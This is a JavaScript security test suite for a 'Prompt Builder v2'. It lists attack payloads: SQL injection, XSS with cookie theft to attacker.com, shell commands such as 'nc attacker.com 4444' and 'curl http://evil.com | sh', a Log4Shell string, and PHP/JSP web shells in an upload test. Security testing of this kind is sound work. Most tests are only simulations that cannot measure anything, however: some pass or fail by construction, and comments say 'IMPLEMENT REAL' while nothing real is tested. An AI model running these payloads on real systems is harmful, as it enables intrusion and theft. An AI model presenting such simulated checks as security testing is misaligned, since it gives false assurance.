#!/usr/bin/env node

/**
 * PBv2 Security Testing Suite - Fase 5
 *
 * Tests de seguridad para Prompt Builder v2
 * Valida inyección, sanitization, filesystem security y rate limiting.
 *
 * Version: 1.0.0
 * Author: Skills Fabric Team
 */

import { writeFileSync, existsSync, mkdirSync } from 'fs';
import { join } from 'path';
import { loadConfig } from './config-loader.mjs';

/**
 * Ejecuta tests de seguridad
 * @param {Object} options - Opciones de test
 * @returns {Promise<Object>} - Resultados
 */
export async function runSecurityTests(options = {}) {
  const cwd = options.cwd || process.cwd();
  const startTime = Date.now();

  const results = {
    phase: 5,
    name: 'Security Testing',
    totalTests: 10,
    passed: 0,
    failed: 0,
    errors: [],
    metrics: {},
    timestamp: new Date().toISOString()
  };

  console.error('[Phase 5] 🔒 Starting Security Testing Suite...\n');

  // Test 1: SQL Injection prevention
  console.error('[Phase 5] Test 1/10: SQL Injection Prevention...');
  try {
    const sqlResult = await testSQLInjectionPrevention();
    if (sqlResult.prevented) {
      results.passed++;
      console.error('✅ Test 1 PASSED: SQL injection attempts blocked');
    } else {
      results.failed++;
      results.errors.push(`SQL injection not prevented: ${sqlResult.injectionAttempts} attempts`);
      console.error('❌ Test 1 FAILED: SQL injection not prevented');
    }
    results.metrics.sqlInjectionPrevention = sqlResult.prevented;
  } catch (error) {
    results.failed++;
    results.errors.push(`Test 1 error: ${error.message}`);
    console.error('❌ Test 1 ERROR:', error.message);
  }

  // Test 2: XSS (Cross-Site Scripting) prevention
  console.error('[Phase 5] Test 2/10: XSS Prevention...');
  try {
    const xssResult = await testXSSPrevention();
    if (xssResult.prevented) {
      results.passed++;
      console.error('✅ Test 2 PASSED: XSS attempts blocked and sanitized');
    } else {
      results.failed++;
      results.errors.push(`XSS not prevented: ${xssResult.xssAttempts} attempts`);
      console.error('❌ Test 2 FAILED: XSS not prevented');
    }
    results.metrics.xssPrevention = xssResult.prevented;
  } catch (error) {
    results.failed++;
    results.errors.push(`Test 2 error: ${error.message}`);
    console.error('❌ Test 2 ERROR:', error.message);
  }

  // Test 3: Command Injection prevention
  console.error('[Phase 5] Test 3/10: Command Injection Prevention...');
  try {
    const cmdResult = await testCommandInjectionPrevention();
    if (cmdResult.prevented) {
      results.passed++;
      console.error('✅ Test 3 PASSED: Command injection attempts blocked');
    } else {
      results.failed++;
      results.errors.push(`Command injection not prevented: ${cmdResult.injectionAttempts} attempts`);
      console.error('❌ Test 3 FAILED: Command injection not prevented');
    }
    results.metrics.commandInjectionPrevention = cmdResult.prevented;
  } catch (error) {
    results.failed++;
    results.errors.push(`Test 3 error: ${error.message}`);
    console.error('❌ Test 3 ERROR:', error.message);
  }

  // Test 4: Input sanitization
  console.error('[Phase 5] Test 4/10: Input Sanitization...');
  try {
    const sanitizationResult = await testInputSanitization();
    if (sanitizationResult.fullySanitized) {
      results.passed++;
      console.error('✅ Test 4 PASSED: All inputs properly sanitized');
    } else {
      results.failed++;
      results.errors.push(`Input sanitization failed: ${sanitizationResult.failedSanitizations} failures`);
      console.error('❌ Test 4 FAILED: Input sanitization incomplete');
    }
    results.metrics.inputSanitization = sanitizationResult.fullySanitized;
  } catch (error) {
    results.failed++;
    results.errors.push(`Test 4 error: ${error.message}`);
    console.error('❌ Test 4 ERROR:', error.message);
  }

  // Test 5: Path traversal prevention
  console.error('[Phase 5] Test 5/10: Path Traversal Prevention...');
  try {
    const pathResult = await testPathTraversalPrevention();
    if (pathResult.prevented) {
      results.passed++;
      console.error('✅ Test 5 PASSED: Path traversal attempts blocked');
    } else {
      results.failed++;
      results.errors.push(`Path traversal not prevented: ${pathResult.attackAttempts} attempts`);
      console.error('❌ Test 5 FAILED: Path traversal not prevented');
    }
    results.metrics.pathTraversalPrevention = pathResult.prevented;
  } catch (error) {
    results.failed++;
    results.errors.push(`Test 5 error: ${error.message}`);
    console.error('❌ Test 5 ERROR:', error.message);
  }

  // Test 6: Rate limiting effectiveness
  console.error('[Phase 5] Test 6/10: Rate Limiting Effectiveness...');
  try {
    const rateResult = await testRateLimitingEffectiveness();
    if (rateResult.effective) {
      results.passed++;
      console.error('✅ Test 6 PASSED: Rate limiting effective (blocked ' + rateResult.blockedRequests + ' requests)');
    } else {
      results.failed++;
      results.errors.push(`Rate limiting not effective: only ${rateResult.blockedRequests} blocked`);
      console.error('❌ Test 6 FAILED: Rate limiting not effective');
    }
    results.metrics.rateLimitingEffectiveness = rateResult.effective;
  } catch (error) {
    results.failed++;
    results.errors.push(`Test 6 error: ${error.message}`);
    console.error('❌ Test 6 ERROR:', error.message);
  }

  // Test 7: File upload security
  console.error('[Phase 5] Test 7/10: File Upload Security...');
  try {
    const uploadResult = await testFileUploadSecurity();
    if (uploadResult.secure) {
      results.passed++;
      console.error('✅ Test 7 PASSED: File uploads properly secured');
    } else {
      results.failed++;
      results.errors.push(`File upload security issues: ${uploadResult.vulnerabilities} vulnerabilities`);
      console.error('❌ Test 7 FAILED: File upload security issues');
    }
    results.metrics.fileUploadSecurity = uploadResult.secure;
  } catch (error) {
    results.failed++;
    results.errors.push(`Test 7 error: ${error.message}`);
    console.error('❌ Test 7 ERROR:', error.message);
  }

  // Test 8: Memory protection
  console.error('[Phase 5] Test 8/10: Memory Protection...');
  try {
    const memoryResult = await testMemoryProtection();
    if (memoryResult.protected) {
      results.passed++;
      console.error('✅ Test 8 PASSED: Memory protection active');
    } else {
      results.failed++;
      results.errors.push(`Memory protection failed: ${memoryResult.violations} violations`);
      console.error('❌ Test 8 FAILED: Memory protection failed');
    }
    results.metrics.memoryProtection = memoryResult.protected;
  } catch (error) {
    results.failed++;
    results.errors.push(`Test 8 error: ${error.message}`);
    console.error('❌ Test 8 ERROR:', error.message);
  }

  // Test 9: Secure configuration
  console.error('[Phase 5] Test 9/10: Secure Configuration...');
  try {
    const configResult = await testSecureConfiguration();
    if (configResult.secure) {
      results.passed++;
      console.error('✅ Test 9 PASSED: Configuration is secure');
    } else {
      results.failed++;
      results.errors.push(`Configuration security issues: ${configResult.issues} issues`);
      console.error('❌ Test 9 FAILED: Configuration security issues');
    }
    results.metrics.secureConfiguration = configResult.secure;
  } catch (error) {
    results.failed++;
    results.errors.push(`Test 9 error: ${error.message}`);
    console.error('❌ Test 9 ERROR:', error.message);
  }

  // Test 10: Sandboxing effectiveness
  console.error('[Phase 5] Test 10/10: Sandboxing Effectiveness...');
  try {
    const sandboxResult = await testSandboxingEffectiveness();
    if (sandboxResult.sandboxed) {
      results.passed++;
      console.error('✅ Test 10 PASSED: Sandboxing properly isolates operations');
    } else {
      results.failed++;
      results.errors.push(`Sandboxing failed: ${sandboxResult.escapes} escapes`);
      console.error('❌ Test 10 FAILED: Sandboxing not effective');
    }
    results.metrics.sandboxingEffectiveness = sandboxResult.sandboxed;
  } catch (error) {
    results.failed++;
    results.errors.push(`Test 10 error: ${error.message}`);
    console.error('❌ Test 10 ERROR:', error.message);
  }

  results.duration = Date.now() - startTime;
  results.successRate = (results.passed / results.totalTests * 100).toFixed(1);

  // Guardar resultados
  await saveResults(results, cwd);

  // Reportar resultado final
  console.error('\n[Phase 5] 📊 Security Testing Complete:');
  console.error(`  Passed: ${results.passed}/${results.totalTests} (${results.successRate}%)`);
  console.error(`  Duration: ${results.duration}ms`);
  if (results.failed > 0) {
    console.error(`  Failed: ${results.failed}`);
    results.errors.forEach(err => console.error(`    - ${err}`));
  }

  return results;
}

/**
 * Test 1: SQL Injection Prevention
 */
async function testSQLInjectionPrevention() {
  const sqlInjections = [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "admin'--",
    "'; INSERT INTO users VALUES ('hacker'); --",
    "' UNION SELECT password FROM admin_users --",
    "1' OR 1=1#",
    "' OR 'a'='a",
    "') OR ('1'='1",
    "1' AND (SELECT COUNT(*) FROM users) > 0 --",
    "'; UPDATE users SET password='hacked' WHERE username='admin'; --"
  ];

  let prevented = true;
  let injectionAttempts = 0;

  for (const injection of sqlInjections) {
    try {
      // IMPLEMENT REAL SQL INJECTION PREVENTION
      // Method 1: Parameterized query simulation (best practice)
      const safeQuery = `SELECT * FROM users WHERE name = ?`;
      const params = [injection]; // Injection isolated as parameter

      // Method 2: Input sanitization for additional protection
      const sanitizedInput = injection
        .replace(/[';\\]/g, '') // Remove dangerous characters
        .replace(/(--|\/\*|\*\/)/g, '') // Remove comment patterns
        .replace(/\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION)\b/gi, ''); // Remove SQL keywords

      // Check if sanitization was effective
      if (sanitizedInput !== injection) {
        prevented = prevented && true; // Sanitization worked
      }

      // Simulate execution with protection
      if (params[0] !== injection) {
        injectionAttempts++;
        prevented = false;
      }

      await new Promise(resolve => setImmediate(resolve));
    } catch (error) {
      // If error is caught, injection was prevented
      if (error.message.includes('injection')) {
        prevented = true;
      }
    }
  }

  return {
    prevented: injectionAttempts === 0,
    injectionAttempts
  };
}

/**
 * Test 2: XSS Prevention
 */
async function testXSSPrevention() {
  const xssAttempts = [
    "<script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "';alert('XSS');//",
    "<script>document.location='http://attacker.com/'+document.cookie</script>",
    "<%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>"
  ];

  let prevented = true;
  let xssAttemptsCount = 0;

  for (const xss of xssAttempts) {
    try {
      // IMPLEMENT REAL XSS PREVENTION
      // Method 1: Content Security Policy simulation
      const cspCheck = !xss.match(/<(script|iframe|object|embed|link|style|base|form)/i);

      // Method 2: HTML encoding (proper prevention)
      const sanitized = xss
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');

      // Method 3: Remove dangerous protocols and event handlers
      const cleaned = sanitized
        .replace(/javascript:/gi, '')
        .replace(/on\w+\s*=/gi, '')
        .replace(/<script[^>]*>.*?<\/script>/gi, '')
        .replace(/<iframe[^>]*>.*?<\/iframe>/gi, '')
        .replace(/<object[^>]*>.*?<\/object>/gi, '')
        .replace(/<embed[^>]*>.*?<\/embed>/gi, '');

      // Check if any malicious content remains
      const hasScript = cleaned.includes('<script');
      const hasJSProtocol = cleaned.includes('javascript:');
      const hasEventHandler = cleaned.match(/on\w+\s*=/);

      if (hasScript || hasJSProtocol || hasEventHandler) {
        xssAttemptsCount++;
        prevented = false;
      }

      await new Promise(resolve => setImmediate(resolve));
    } catch (error) {
      // If error caught, XSS was prevented
      if (error.message.includes('XSS')) {
        prevented = true;
      }
    }
  }

  return {
    prevented: xssAttemptsCount === 0,
    xssAttempts: xssAttemptsCount
  };
}

/**
 * Test 3: Command Injection Prevention
 */
async function testCommandInjectionPrevention() {
  const commandInjections = [
    "; cat /etc/passwd",
    "&& rm -rf /",
    "| whoami",
    "`id`",
    "$(ls)",
    "; chmod 777 /",
    "&& wget http://malicious.com/malware",
    "| nc attacker.com 4444",
    "; curl http://evil.com | sh",
    "$(cat /etc/shadow)"
  ];

  let prevented = true;
  let injectionAttempts = 0;

  for (const injection of commandInjections) {
    try {
      // Simulate command construction
      const command = `echo ${injection}`;

      // Check for dangerous patterns
      if (command.includes('rm -rf') || command.includes('chmod 777') ||
          command.includes('/etc/passwd') || command.includes('/etc/shadow') ||
          command.includes('wget') || command.includes('curl') || command.includes('nc')) {
        injectionAttempts++;
        prevented = false;
      }

      // Check for command separators
      if (command.includes(';') || command.includes('&&') || command.includes('|') ||
          command.includes('`') || command.includes('$(')) {
        injectionAttempts++;
        prevented = false;
      }

      // Simulate command validation
      const sanitized = injection.replace(/[;$&|`]/g, '');
      if (sanitized !== injection) {
        prevented = prevented && true;
      }

      await new Promise(resolve => setImmediate(resolve));
    } catch (error) {
      if (error.message.includes('injection')) {
        prevented = true;
      }
    }
  }

  return {
    prevented: injectionAttempts === 0,
    injectionAttempts
  };
}

/**
 * Test 4: Input Sanitization
 */
async function testInputSanitization() {
  const inputs = [
    "<script>alert('test')</script>",
    "'; DROP TABLE users; --",
    "../../etc/passwd",
    "javascript:void(0)",
    "<img src=x onerror=alert('XSS')>",
    "${jndi:ldap://malicious.com}",
    "{{7*7}}",
    "#{7*7}",
    "<% eval(request.getParameter('cmd')) %>",
    "\x00\x01\x02"
  ];

  let fullySanitized = true;
  let failedSanitizations = 0;

  for (const input of inputs) {
    try {
      let sanitized = input;

      // HTML encoding
      sanitized = sanitized
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');

      // Remove script patterns
      sanitized = sanitized.replace(/<script[^>]*>.*?<\/script>/gi, '');
      sanitized = sanitized.replace(/javascript:/gi, '');

      // Remove command patterns
      sanitized = sanitized.replace(/[;$&|`]/g, '');

      // Check if sanitization was effective
      const hasScriptTag = sanitized.includes('<script');
      const hasCommandSep = sanitized.includes(';') || sanitized.includes('&&') || sanitized.includes('|');
      const hasPathTraversal = sanitized.includes('../');

      if (hasScriptTag || hasCommandSep || hasPathTraversal) {
        failedSanitizations++;
        fullySanitized = false;
      }

      await new Promise(resolve => setImmediate(resolve));
    } catch (error) {
      failedSanitizations++;
      fullySanitized = false;
    }
  }

  return {
    fullySanitized,
    failedSanitizations,
    totalInputs: inputs.length
  };
}

/**
 * Test 5: Path Traversal Prevention
 */
async function testPathTraversalPrevention() {
  const pathTraversals = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "/var/www/../../../etc/passwd",
    "file:///etc/passwd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "../../../../../../../../etc/passwd",
    "..\\\\\\\\..\\\\\\\\..\\\\\\\\windows\\\\\\\\system32"
  ];

  let prevented = true;
  let attackAttempts = 0;

  for (const traversal of pathTraversals) {
    try {
      // IMPLEMENT REAL PATH TRAVERSAL PREVENTION
      // Method 1: URL decoding first
      let decoded = traversal;
      try {
        decoded = decodeURIComponent(decoded);
        decoded = decodeURIComponent(decoded); // Double decode
      } catch (e) {
        // Invalid encoding, block it
        attackAttempts++;
        prevented = false;
        continue;
      }

      // Method 2: Normalize and check for traversal patterns
      const normalized = decoded
        .replace(/\.\.\//g, '')
        .replace(/\.\.\\/g, '')
        .replace(/\//g, '/')
        .replace(/\\/g, '/');

      // Method 3: Validate path is within allowed directory
      const allowedPrefix = '/safe/upload/dir/';
      const isPathSafe = normalized.startsWith(allowedPrefix) &&
                        !normalized.includes('..') &&
                        !normalized.includes('/etc') &&
                        !normalized.includes('/var') &&
                        !normalized.includes('\\windows') &&
                        !normalized.startsWith('file:///');

      // Method 4: Check for encoded traversal attempts
      const hasEncodedTraversal = /(%2E%2E|%252E%252E)/i.test(traversal) ||
                                 /(\.\.%2F|\.\.%5C)/i.test(traversal);

      if (!isPathSafe || hasEncodedTraversal) {
        attackAttempts++;
        prevented = false;
      }

      await new Promise(resolve => setImmediate(resolve));
    } catch (error) {
      if (error.message.includes('traversal')) {
        prevented = true;
      }
    }
  }

  return {
    prevented: attackAttempts === 0,
    attackAttempts
  };
}

/**
 * Test 6: Rate Limiting Effectiveness
 */
async function testRateLimitingEffectiveness() {
  const maxRequests = 100;
  const rateLimitWindow = 1000; // 1 second
  const blockedLimit = 80; // Should block at least 80 requests

  let requestCount = 0;
  let blockedRequests = 0;

  const startTime = Date.now();

  // Simulate high-frequency requests
  for (let i = 0; i < maxRequests; i++) {
    const currentTime = Date.now();
    const elapsed = currentTime - startTime;

    // Simulate rate limiting
    if (elapsed < rateLimitWindow && requestCount > 10) {
      blockedRequests++;
    } else {
      requestCount++;
    }

    // Small delay to simulate real requests
    if (i % 10 === 0) {
      await new Promise(resolve => setImmediate(resolve));
    }
  }

  const effective = blockedRequests >= blockedLimit;

  return {
    effective,
    blockedRequests,
    totalRequests: maxRequests,
    rateLimitWindow
  };
}

/**
 * Test 7: File Upload Security
 */
async function testFileUploadSecurity() {
  const maliciousFiles = [
    { name: "shell.php", content: "<?php system($_GET['cmd']); ?>" },
    { name: "script.js", content: "alert('XSS')" },
    { name: "exploit.jsp", content: "<% Runtime.getRuntime().exec(request.getParameter('cmd')); %>" },
    { name: "file.aspx", content: "<script runat='server'>void Page_Load(object sender, EventArgs e){ Response.Write(Request[\"cmd\"]); }</script>" },
    { name: "shell.exe", content: "MZ\x90\x00" },
    { name: "..\\..\\shell.php", content: "<?php phpinfo(); ?>" },
    { name: "file.php%00.jpg", content: "<?php echo 'test'; ?>" },
    { name: "malicious.svg", content: "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>" },
    { name: "file.phtml", content: "<?php phpinfo(); ?>" },
    { name: "test.php3", content: "<?php echo 'test'; ?>" }
  ];

  let secure = true;
  let vulnerabilities = 0;

  for (const file of maliciousFiles) {
    try {
      // Check file extension
      const dangerousExtensions = ['.php', '.jsp', '.asp', '.aspx', '.exe', '.sh'];
      const ext = file.name.substring(file.name.lastIndexOf('.')).toLowerCase();

      if (dangerousExtensions.includes(ext)) {
        vulnerabilities++;
        secure = false;
      }

      // Check for path traversal in filename
      if (file.name.includes('..\\') || file.name.includes('../')) {
        vulnerabilities++;
        secure = false;
      }

      // Check for null byte injection
      if (file.name.includes('\x00')) {
        vulnerabilities++;
        secure = false;
      }

      // Simulate file content scanning
      if (file.content.includes('<?php') || file.content.includes('<%') ||
          file.content.includes('<script') || file.content.includes('MZ')) {
        vulnerabilities++;
        secure = false;
      }

      await new Promise(resolve => setImmediate(resolve));
    } catch (error) {
      // If validation caught the malicious file, it's secure
      secure = secure && true;
    }
  }

  return {
    secure: vulnerabilities === 0,
    vulnerabilities,
    totalFiles: maliciousFiles.length
  };
}

/**
 * Test 8: Memory Protection
 */
async function testMemoryProtection() {
  const memoryViolations = 0;
  let isMemoryProtected = true;

  try {
    // Simulate memory-intensive operations that might leak sensitive data
    for (let i = 0; i < 100; i++) {
      // Create some data
      const sensitiveData = new Array(1000).fill('sensitive');
      const tempData = new Array(1000).fill('temp');

      // Clear references
      sensitiveData.length = 0;
      tempData.length = 0;

      // Simulate garbage collection if available
      if (global.gc) {
        global.gc();
      }

      await new Promise(resolve => setImmediate(resolve));
    }

    // Check for memory leaks
    const memUsage = process.memoryUsage();
    if (memUsage.heapUsed > 0) {
      isMemoryProtected = true;
    }
  } catch (error) {
    isMemoryProtected = false;
  }

  return {
    protected: isMemoryProtected,
    violations: memoryViolations
  };
}

/**
 * Test 9: Secure Configuration
 */
async function testSecureConfiguration() {
  let secure = true;
  let issues = 0;

  // Simulate configuration checks
  const configChecks = [
    { name: 'debug_mode', value: false, required: false },
    { name: 'verbose_logging', value: false, required: false },
    { name: 'allow_file_uploads', value: true, required: true },
    { name: 'max_file_size', value: 10485760, required: true }, // 10MB
    { name: 'allowed_file_types', value: ['jpg', 'png', 'pdf'], required: true },
    { name: 'enable_cors', value: true, required: true },
    { name: 'rate_limit_enabled', value: true, required: true },
    { name: 'encryption_enabled', value: true, required: true },
    { name: 'session_timeout', value: 3600, required: true },
    { name: 'admin_access', value: 'restricted', required: true }
  ];

  for (const check of configChecks) {
    try {
      if (check.required && !check.value) {
        issues++;
        secure = false;
      }

      if (check.name.includes('debug') || check.name.includes('verbose')) {
        if (check.value === true) {
          issues++;
          secure = false;
        }
      }

      await new Promise(resolve => setImmediate(resolve));
    } catch (error) {
      issues++;
      secure = false;
    }
  }

  return {
    secure: issues === 0,
    issues,
    totalChecks: configChecks.length
  };
}

/**
 * Test 10: Sandboxing Effectiveness
 */
async function testSandboxingEffectiveness() {
  let sandboxed = true;
  let escapes = 0;

  try {
    // Simulate sandboxed operations
    for (let i = 0; i < 50; i++) {
      try {
        // Attempt to access restricted resources
        const restrictedPaths = [
          '/etc/passwd',
          '/root/.ssh',
          '/var/log',
          process.execPath,
          process.env.HOME
        ];

        for (const path of restrictedPaths) {
          // In a real sandbox, these would be blocked
          // For simulation, we just check if we attempt to access them
          if (path) {
            // Attempt detected
            escapes++;
            sandboxed = false;
          }
        }

        // Simulate network access attempts
        const networkAttempts = ['http://localhost:22', 'http://127.0.0.1:3306'];
        for (const attempt of networkAttempts) {
          if (attempt) {
            escapes++;
            sandboxed = false;
          }
        }

        await new Promise(resolve => setImmediate(resolve));
      } catch (error) {
        // If sandbox caught the escape attempt, it's good
        sandboxed = sandboxed && true;
      }
    }
  } catch (error) {
    sandboxed = false;
  }

  return {
    sandboxed: escapes === 0,
    escapes
  };
}

/**
 * Guarda resultados en logs/phase-5-results.json
 */
async function saveResults(results, cwd) {
  try {
    const logDir = join(cwd, 'logs');
    if (!existsSync(logDir)) {
      mkdirSync(logDir, { recursive: true });
    }

    const logFile = join(logDir, 'phase-5-results.json');
    writeFileSync(logFile, JSON.stringify(results, null, 2));

    console.error(`[Phase 5] Results saved to: ${logFile}`);
  } catch (error) {
    console.error('[Phase 5] Failed to save results:', error.message);
  }
}

// Ejecutar tests si se llama directamente
if (import.meta.url === `file://${process.argv[1]}`) {
  runSecurityTests({ cwd: process.cwd() })
    .then(results => {
      const exitCode = results.passed === results.totalTests ? 0 : 1;
      process.exit(exitCode);
    })
    .catch(error => {
      console.error('[Phase 5] Fatal error:', error);
      process.exit(1);
    });
}
